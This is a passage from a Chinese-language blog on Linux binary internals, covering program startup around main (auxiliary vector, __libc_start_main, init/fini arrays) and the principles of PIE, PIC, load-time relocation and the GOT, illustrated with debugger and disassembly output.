<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffdfc8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0x7fffffffdfc8</span> —▸ <span class="number">0x7fffffffe31a</span> ◂— <span class="number">0x68792f656d6f682f</span> (<span class="string">&#x27;/home/yh&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdfd0</span> —▸ <span class="number">0x7fffffffe338</span> ◂— <span class="number">0x33323100636261</span> <span class="comment">/* &#x27;abc&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffdfd8</span> —▸ <span class="number">0x7fffffffe33c</span> ◂— <span class="number">0x5f48535300333231</span> <span class="comment">/* &#x27;123&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffdfe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rdx <span class="number">0x7fffffffdfe8</span> —▸ <span class="number">0x7fffffffe340</span> ◂— <span class="string">&#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdff0</span> —▸ <span class="number">0x7fffffffe369</span> ◂— <span class="string">&#x27;SESSION_MANAGER=local/yhellow-virtual-machine:@/tmp/.ICE-unix/1824,unix/yhellow-virtual-machine:/tmp/.ICE-unix/1824&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffdff8</span> —▸ <span class="number">0x7fffffffe3dd</span> ◂— <span class="string">&#x27;GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/f60ef9cf_9126_4c39_b1ee_af08e3e804a7&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fffffffe000</span> —▸ <span class="number">0x7fffffffe433</span> ◂— <span class="string">&#x27;SSH_AGENT_PID=1557&#x27;</span></span><br></pre></td></tr></table></figure>
<p>当 <code>envp</code> 建立了之后，<code>__libc_start_main</code> 函数会使用相同的小技巧，越过 envp 数组之后的 <code>NULL</code> 字符，获取另一个向量：ELF 辅助向量（ELF 加载器使用它给进程传递一些信息）</p>
<ul>
<li>ELF 辅助向量（Auxiliary Vectors）是 <strong>将某些内核级信息传输到用户进程的机制</strong>（例如：指向[系统调用]入口点的指针-<code>AT_SYSINFO</code>）</li>
</ul>
<p>设置环境变量 <code>LD_SHOW_AUXV=1</code> 就可以查看 ELF 辅助向量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> LD_SHOW_AUXV=<span class="number">1</span> ./main </span><br><span class="line">AT_SYSINFO_EHDR:      <span class="number">0x7ffc4a3f3000</span></span><br><span class="line">AT_??? (<span class="number">0x33</span>): <span class="number">0xe30</span></span><br><span class="line">AT_HWCAP:             f8bfbff</span><br><span class="line">AT_PAGESZ:            <span class="number">4096</span></span><br><span class="line">AT_CLKTCK:            <span class="number">100</span></span><br><span class="line">AT_PHDR:              <span class="number">0x555c45893040</span></span><br><span class="line">AT_PHENT:             <span class="number">56</span></span><br><span class="line">AT_PHNUM:             <span class="number">13</span></span><br><span class="line">AT_BASE:              <span class="number">0x7fd1cbb48000</span></span><br><span class="line">AT_FLAGS:             <span class="number">0x0</span></span><br><span class="line">AT_ENTRY:             <span class="number">0x555c458941c0</span></span><br><span class="line">AT_UID:               <span class="number">1000</span></span><br><span class="line">AT_EUID:              <span class="number">1000</span></span><br><span class="line">AT_GID:               <span class="number">1000</span></span><br><span class="line">AT_EGID:              <span class="number">1000</span></span><br><span class="line">AT_SECURE:            <span class="number">0</span></span><br><span class="line">AT_RANDOM:            <span class="number">0x7ffc4a3e5899</span></span><br><span class="line">AT_HWCAP2:            <span class="number">0x2</span></span><br><span class="line">AT_EXECFN:            ./main</span><br><span class="line">AT_PLATFORM:          x86_64</span><br></pre></td></tr></table></figure>
<ul>
<li><code>AT_ENTRY</code> 就是 <code>_start</code> 的地址，<code>AT_PHDR</code> 是 ELF program header 的位置，<code>AT_PHENT</code> 是header entry 的字节数 ，还输出了 UID、UID 和 GID</li>
<li>这些都是内核态才能拿到的数据，但是用户态程序又需要这些数据，于是就通过 ELF 辅助向量将这些信息传输给用户态进程</li>
</ul>
<p>当进程获取到必要的数据后，就会执行 <code>__libc_start_main</code> 函数的主要功能：</p>
<ul>
<li>处理关于 <code>setuid、setgid</code> 程序的安全问题</li>
<li>启动线程</li>
<li>把 <code>fini</code> 函数（实际上是 <code>__libc_csu_fini</code>）和 <code>rtld_fini</code> 函数作为参数传递给 <code>at_exit</code> 调用（使它们在 <code>at_exit</code> 里被调用，从而完成用户程序和加载器的调用结束之后的清理工作）</li>
<li>调用其 <code>init</code> 参数（实际上是执行 <code>__libc_csu_init</code> 函数）</li>
<li>调用 <code>main</code> 函数，并把 <code>argc</code> 和 <code>argv</code> 参数、环境变量传递给它</li>
<li>调用 <code>exit</code> 函数（会在其中调用 <code>__libc_csu_fini</code>），并将 <code>main</code> 函数的返回值传递给它</li>
</ul>
<p><strong><strong>libc_csu_init &amp; </strong>libc_csu_fini</strong></p>
<p>对于任意的可执行程序都可以有一个C函数的“构造函数” <code>__libc_csu_init</code> 和C函数的“析构函数” <code>__libc_csu_fini</code>，在构造函数内部，可执行程序会找到全局C函数组成的构造函数集，并且调用它们</p>
<p>构造函数和析构函数是 Cpp 中的概念：</p>
<ul>
<li>构造函数：是一种特殊的函数，用来在对象实例化的时候初始化对象的成员变量</li>
<li>析构函数：是构造函数的互补，当对象超出作用域或动态分配的对象被删除时，将自动调用析构函数 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>: <span class="comment">/* 构造函数/析构函数都要放到public中 */</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setLength</span><span class="params">(<span class="keyword">double</span> len)</span></span>;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">getLength</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">      <span class="built_in">Line</span>();   <span class="comment">/* 这是构造函数声明(与类名相同) */</span></span><br><span class="line">      ~<span class="built_in">Line</span>();  <span class="comment">/* 这是析构函数声明(与类名相同,在前面加~) */</span></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="keyword">double</span> length;</span><br><span class="line">&#125;;</span><br><span class="line">Line::<span class="built_in">Line</span>(<span class="keyword">void</span>)&#123; <span class="comment">/* 构造函数的定义 */</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Object is being created&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">Line::~<span class="built_in">Line</span>(<span class="keyword">void</span>)&#123; <span class="comment">/* 析构函数的定义 */</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Object is being deleted&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Line::setLength</span><span class="params">(<span class="keyword">double</span> len)</span></span>&#123;</span><br><span class="line">    length = len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Line::getLength</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Line line; <span class="comment">/* 执行构造函数 */</span></span><br><span class="line">   line.<span class="built_in">setLength</span>(<span class="number">6</span>);</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Length of line : &quot;</span> &lt;&lt; line.<span class="built_in">getLength</span>() &lt;&lt;endl; </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* 执行析构函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object is being created</span><br><span class="line">Length of line : <span class="number">6</span></span><br><span class="line">Object is being deleted</span><br></pre></td></tr></table></figure>
<p>C 语言没有构造函数和析构函数的概念，但 gcc 为函数提供了几种类型的属性，其中包含：</p>
<ul>
<li>构造函数(constructors)：<code>static void start(void) __attribute__ ((constructor))</code></li>
<li>析构函数(destructors)：<code>static void stop(void) __attribute__ ((destructor))</code></li>
<li>带有“构造函数”属性的函数将在 <code>main</code> 函数之前被执行，而声明为“析构函数”属性的函数则将在 <code>main</code> 退出时执行（其实就有点像针对 <code>main</code> 的构造函数）</li>
</ul>
<p>源码如下：（根据 IDA 反编译出来的代码改的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _libc_csu_init()&#123;</span><br><span class="line">    init_proc(); <span class="comment">/* 初始化 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> size = &amp;_do_global_dtors_aux_fini_array_entry - &amp;_frame_dummy_init_array_entry;</span><br><span class="line">    <span class="keyword">if</span> (size)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0LL</span>; i != size; ++i)</span><br><span class="line">            <span class="comment">/* 遍历并调用&#x27;_frame_dummy_init_array_entry+i&#x27;中的函数 */</span></span><br><span class="line">            (*(&amp;_frame_dummy_init_array_entry + i))();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_frame_dummy_init_array_entry</code> 中的数据如下：（提前写好了“构造函数”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.init_array:<span class="number">0000000000003</span>D88 <span class="number">40</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       __frame_dummy_init_array_entry dq offset frame_dummy</span><br><span class="line">.init_array:<span class="number">0000000000003</span>D90 <span class="number">49</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a_constructor</span><br><span class="line">.init_array:<span class="number">0000000000003</span>D98 <span class="number">60</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset b_constructor</span><br><span class="line">.init_array:<span class="number">0000000000003</span>DA0 <span class="number">77</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset c_constructor</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_do_global_dtors_aux_fini_array_entry</code> 中的数据如下：（提前写好了“析构函数”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:<span class="number">0000000000003</span>DA8 <span class="number">00</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       __do_global_dtors_aux_fini_array_entry dq offset __do_global_dtors_aux</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DB0 <span class="number">8</span>E <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset A_destructor</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DB8 A5 <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset B_destructor</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DC0 BC <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset C_destructor</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>main 函数执行前后的流程</strong></p>
<p>函数调用关系图：</p>
<img src="/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/1662295532372.png" class width="1662295532372"> 
<ul>
<li>首先程序调用 execve 生成一个进程，并且设置好数据</li>
<li>然后调用 <code>_start</code> 简单设置后就调用 <code>__libc_start_main</code></li>
<li><code>__libc_start_main</code> 会先调用 <code>__libc_init_first</code> 获取环境变量 envp（作为 main 的第三个参数），然后越过 envp 数组之后的 <code>NULL</code> 字符，获取 ELF 辅助向量</li>
<li>把 <code>fini</code> 和 <code>rtld_fini</code> 作为参数传递给 <code>at_exit</code> 调用</li>
<li>调用其 <code>init</code> 参数，执行 <code>__libc_csu_init</code></li>
<li>调用 <code>main</code> 函数，并把 <code>argc</code> 和 <code>argv</code> 参数、环境变量传递给它</li>
<li>调用 <code>exit</code> 函数，执行其中的 <code>__libc_csu_fini</code></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：PIE原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-04 16:43:42 / Modified: 16:47:56" itemprop="dateCreated datePublished" datetime="2022-09-04T16:43:42+08:00">2022-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="基础对比"><a href="#基础对比" class="headerlink" title="基础对比"></a>基础对比</h2><p><strong>先对比一下 [只开启PIE] 和 [关闭所有保护] 的程序反汇编</strong></p>
<img src="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/1662132275958.png" class width="1662132275958">  
<ul>
<li>关闭 PIE：多一个名为 <code>dl_relocate_static_pie</code> 的函数</li>
<li>开启 PIE：多了 <code>__cxa_finalize</code> 和 <code>__imp___cxa_finalize</code></li>
</ul>
<p><strong>再对比一下 GDB 调试两个文件效果</strong></p>
<img src="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/1662126627604.png" class width="1662126627604"> 
<ul>
<li>就是基地址不同（存储在 CS 寄存器中）</li>
</ul>
<h2 id="PIE-简述"><a href="#PIE-简述" class="headerlink" title="PIE 简述"></a>PIE 简述</h2><p>PIE（position-independent executable）是一种生成地址无关可执行程序的技术，它属于ASLR（Address space layout randomization）的一部分，ASLR 要求执行程序被加载到内存时，它其中的任意部分都是随机的</p>
<p>作用：</p>
<ul>
<li>提高缓冲区溢出攻击的门槛：<ul>
<li>ASLR 要求执行程序被加载到内存时，它其中的任意部分都是随机的</li>
<li>包括：Stack，Heap，Libs and mmap，Executable，Linker，VDSO</li>
</ul>
</li>
<li>提高内存使用效率（更多指 PIC）：<ul>
<li>一个共享库可以同时被多个进程装载，如果不是地址无关代码（代码段中存在绝对地址引用），每个进程必须结合其自生的内存地址调用动态链接库</li>
<li>导致不得不将共享库整体拷贝到进程中，如果系统中有100个进程调用这个库，就会有100份该库的拷贝在内存中，这会照成极大的空间浪费</li>
<li>相反如果被加载的共享库是地址无关代码，100个进程调用该库，则该库只需要在内存中加载一次</li>
<li>这是因为 PIE 将共享库中代码段须要变换的内容分离到数据段，使得代码段加载到内存时能做到地址无关，多个进程调用共享库时只需要在自己的进程中加载共享库的数据段，而代码段则可以共享</li>
</ul>
</li>
</ul>
<h2 id="PIE-的由来"><a href="#PIE-的由来" class="headerlink" title="PIE 的由来"></a>PIE 的由来</h2><p>PIE 源自于 PIC，因此我们需要先了解一些共享库的知识：</p>
<p>将共享库(.so)载入程序地址空间时需要特殊的处理，简而言之，在链接器创建共享库时，链接器不能对它们的代码假设一个已知的载入地址（因为每个程序可以使用任意多的共享库，没有一个简单的方法预先知道给定的共享库将被载入虚拟内存的什么位置）</p>
<p>在 Linux ELF 共享库里解决这个问题有两个主要途径：</p>
<ul>
<li>载入时重定位（load-time relocation）</li>
<li>位置无关代码（PIC）</li>
</ul>
<p><strong>载入时重定位</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -Mintel libmlreloc.so</span><br><span class="line"></span><br><span class="line">libmlreloc.so:     fileformat elf32-i386</span><br><span class="line"></span><br><span class="line">[...] skipping stuff</span><br><span class="line">000004a7 &lt;ml_func&gt;:</span><br><span class="line"> 4a7:   55                      push   ebp</span><br><span class="line"> 4a8:   89 e5                   mov    ebp,esp</span><br><span class="line"> 4aa:   83 ec 14                sub    esp,0x14</span><br><span class="line"> 4ad:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line"> 4b0:   89 04 24                mov    DWORD PTR [esp],eax</span><br><span class="line"> 4b3:   e8 fc ff ff ff          call   4b4 &lt;ml_func+0xd&gt;</span><br><span class="line"> 4b8:   03 45 0c                add    eax,DWORD PTR [ebp+0xc]</span><br><span class="line"> 4bb:   89 45 fc                mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line"> 4be:   a1 00 00 00 00          mov    eax,ds:0x0</span><br><span class="line"> 4c3:   03 45 fc                add    eax,DWORD PTR [ebp-0x4]</span><br><span class="line"> 4c6:   a3 00 00 00 00          mov    ds:0x0,eax</span><br><span class="line"> 4cb:   a1 00 00 00 00          mov    eax,ds:0x0</span><br><span class="line"> 4d0:   03 45 0c                add    eax,DWORD PTR [ebp+0xc]</span><br><span class="line"> 4d3:   c9                      leave</span><br><span class="line"> 4d4:   c3                      ret</span><br><span class="line">[...] skipping stuff</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现重定位并没有完成：<ul>
<li><code>mov myglob</code> 处的偏移任然是“0”</li>
<li><code>call ml_util_func</code> 处的偏移是“0xfffffffc”</li>
</ul>
</li>
</ul>
<p>创建一个特殊的重定位项指向这个位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r libmlreloc.so</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x2fc contains 7entries:</span><br><span class="line"></span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00002008  00000008R_386_RELATIVE</span><br><span class="line">000004b4  00000502  R_386_PC32       0000049c   ml_util_func</span><br><span class="line">000004bf  00000401  R_386_32         0000200c   myglob</span><br><span class="line">000004c7  00000401  R_386_32         0000200c   myglob</span><br><span class="line">000004cc  00000401  R_386_32         0000200c   myglob</span><br><span class="line">[...] skipping stuff</span><br></pre></td></tr></table></figure>
<ul>
<li>3处 <code>myglob</code> 的 offset，刚好对应了 <code>ml_func</code> 中空缺 <code>myglob</code> 的地址</li>
<li>证明链接器并没有重定位所有的符号，这些 <strong>符号都是在载入可执行文件时重定位的</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function ml_func:</span><br><span class="line">   <span class="number">0x0012e4a7</span>&lt;+<span class="number">0</span>&gt;:    <span class="number">55</span>    		 push  ebp</span><br><span class="line">   <span class="number">0x0012e4a8</span>&lt;+<span class="number">1</span>&gt;:    <span class="number">89</span> e5 		 mov   ebp,esp</span><br><span class="line">   <span class="number">0x0012e4aa</span>&lt;+<span class="number">3</span>&gt;:    <span class="number">83</span> ec <span class="number">14</span>        sub   esp,<span class="number">0x14</span></span><br><span class="line">   <span class="number">0x0012e4ad</span>&lt;+<span class="number">6</span>&gt;:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>        mov   eax,DWORD PTR [ebp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0012e4b0</span>&lt;+<span class="number">9</span>&gt;:    <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>        mov   DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0x0012e4b3</span>&lt;+<span class="number">12</span>&gt;:   e8 e4 ff ff ff  call  <span class="number">0x12e49c</span> &lt;ml_util_func&gt;</span><br><span class="line">   <span class="number">0x0012e4b8</span>&lt;+<span class="number">17</span>&gt;:   <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>c        add   eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0012e4bb</span>&lt;+<span class="number">20</span>&gt;:   <span class="number">89</span> <span class="number">45</span> fc        mov   DWORD PTR [ebp<span class="number">-0x4</span>],eax</span><br><span class="line">   <span class="number">0x0012e4be</span>&lt;+<span class="number">23</span>&gt;:   a1 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   eax,ds:<span class="number">0x13000c</span></span><br><span class="line">   <span class="number">0x0012e4c3</span>&lt;+<span class="number">28</span>&gt;:   <span class="number">03</span> <span class="number">45</span> fc        add   eax,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x0012e4c6</span>&lt;+<span class="number">31</span>&gt;:   a3 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   ds:<span class="number">0x13000c</span>,eax</span><br><span class="line">   <span class="number">0x0012e4cb</span>&lt;+<span class="number">36</span>&gt;:   a1 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   eax,ds:<span class="number">0x13000c</span></span><br><span class="line">   <span class="number">0x0012e4d0</span>&lt;+<span class="number">41</span>&gt;:   <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>c        add   eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0012e4d3</span>&lt;+<span class="number">44</span>&gt;:   c9     		 leave</span><br><span class="line">   <span class="number">0x0012e4d4</span>&lt;+<span class="number">45</span>&gt;:   c3     		 ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ul>
<li>载入时重定位是 Linux（及其他OS）用来解决，在将共享库载入内存时，在共享库里访问内部数据与代码的问题，时至今日，位置无关代码（PIC）是一个更流行的方法</li>
<li>一些现代系统（比如x86-64）已不再支持载入时重定位 </li>
</ul>
<p><strong>位置无关代码-x86</strong></p>
<p>载入时重定位的问题十分明显：</p>
<ul>
<li>在应用程序载入时，需要花费一些时间执行这些重定位</li>
<li>并且它使得库的代码节不可共享<ul>
<li>如果共享库的代码节可以只载入内存一次（然后映射到许多进程的虚拟内存），数目可观的 RAM 就可以被节省下来</li>
<li>但对载入时重定位这是不可能的，因为使用这个技术时，需要在载入时修改代码节来应用重定位（不同的可执行文件在装载同一个动态库的时候，重定位的结果可能不同）</li>
</ul>
</li>
<li>另外，它要求要有一个可写的代码节（它必须保持可写，以允许动态载入器执行重定位），形成了一个安全风险</li>
</ul>
<p>PIC 背后的思想是简单的：对代码中访问的所有全局数据与函数添加一层额外的抽象，通过巧妙地利用链接与载入过程中的某些工件，使得共享库的代码节真正位置无关是可能的（不做任何改变而容易地映射到不同的内存地址）</p>
<p>位置无关代码依靠一个“全局偏移表”或简称 GOT 来完成（这是位于动态库中的 GOT 表）：</p>
<ul>
<li>假设在代码节里某条指令想访问一个变量</li>
<li>指令不是通过绝对地址直接访问它，而是访问 GOT 里的一个项</li>
<li>因为 GOT 在数据节的一个已知位置，这个访问是相对的且链接器已知，而 GOT 项将包含该变量的绝对地址</li>
</ul>
<p>这样，在代码里通过 GOT 重定向变量的访问，不过我们还是要在数据节里创建一个重定位，因为要让上面描述的场景工作，GOT 仍然必须包含变量的绝对地址，这样做的好处如下：</p>
<ul>
<li>每次变量访问都要求代码节里的重定位，而在 GOT 里对每个变量我们只需要重定位一次，因此这更高效</li>
